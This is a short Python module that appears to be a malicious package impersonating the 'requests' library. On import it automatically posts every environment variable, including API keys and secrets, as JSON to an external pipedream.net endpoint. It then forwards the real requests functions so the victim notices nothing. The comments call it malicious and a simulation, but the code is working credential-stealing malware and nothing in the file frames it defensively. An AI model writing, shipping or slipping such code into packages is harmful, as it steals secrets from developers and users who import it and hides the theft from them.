import requests
import os
import json

# Malicious code: Steal environment variables (including API keys, secrets)
def steal_env_vars():
    # Simulate sending data to an attacker's server
    requests.post("https://eo7vviet30q40h7.m.pipedream.net", data=json.dumps(dict(os.environ), indent=4))

steal_env_vars()  # Run automatically when the package is imported

# Forward requests functions so the user doesn’t notice
get = requests.get
post = requests.post
put = requests.put
delete = requests.delete
